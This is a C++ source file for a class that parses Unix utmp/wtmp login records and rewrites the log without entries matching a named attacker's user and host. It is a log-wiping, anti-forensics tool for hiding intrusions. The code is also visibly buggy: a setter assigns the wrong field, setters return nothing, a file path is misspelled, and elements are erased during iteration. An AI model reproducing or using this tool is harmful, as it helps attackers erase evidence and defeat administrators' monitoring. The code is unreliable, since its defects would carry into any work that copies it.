#include "Utmp_Parse.h"

UtmpParser::UtmpParser(std::string wtmp_file_path)
{
	_file_path = wtmp_file_path;
}

UtmpParser::~UtmpParser()
{
	for (int i = 0; i < _utmp_vector.size(); i++)
	{
		delete _utmp_vector[i];
	}
	_utmp_vector.clear();
}

std::string UtmpParser::get_attacker_name()
{
	return _attacker_name;
}

std::string UtmpParser::get_attacker_address()
{
	return _attacker_address;
}

std::string UtmpParser::get_utmp_file()
{
	return _file_path;
}

std::vector<utmp*> UtmpParser::get_utmp_vector()
{
	return _utmp_vector;
}

UtmpParser& UtmpParser::set_attacker_name(std::string name)
{
	_attacker_address = name;
}

UtmpParser& UtmpParser::set_attacker_address(std::string address)
{
	_attacker_address = address;
}

UtmpParser& UtmpParser::set_utmp_file(std::string path)
{
	_file_path = path;
}

UtmpParser& UtmpParser::set_utmp_vector(std::vector<utmp*> utmp_vector)
{
	_utmp_vector = utmp_vector;
}

std::vector<utmp*> UtmpParser::get_content()
{
	std::vector<utmp*> utmp_vector;
	FILE* utmp_file = fopen(_file_path.c_str(), "r");
	while (true)
	{
		utmp *utmp_member = new utmp();
		fread(utmp_member, sizeof(utmp), 1, utmp_file);
		if (utmp_member->ut_type == 0)
			break;
		utmp_vector.push_back(utmp_member);
	}
	fclose(utmp_file);
	return utmp_vector;
}

UtmpParser& UtmpParser::modifier()
{
	_utmp_vector = get_content();
	mode_t b = S_IRWXU | S_IRWXG;
	FILE* utmp_file = fopen("/var/log/testing", "w");
	int a = chmod("/vat/log/testing", 0664);
	for (std::vector<utmp*>::iterator i = _utmp_vector.begin(); i != _utmp_vector.end(); i++)
	{
		if ((*i)->ut_user == _attacker_name && (*i)->ut_host == _attacker_address)
		{
			_utmp_vector.erase(i);
		}
		else
		{
			fwrite((*i), sizeof(utmp), 1, utmp_file);
		}
	}
	fclose(utmp_file);
	return *this;
}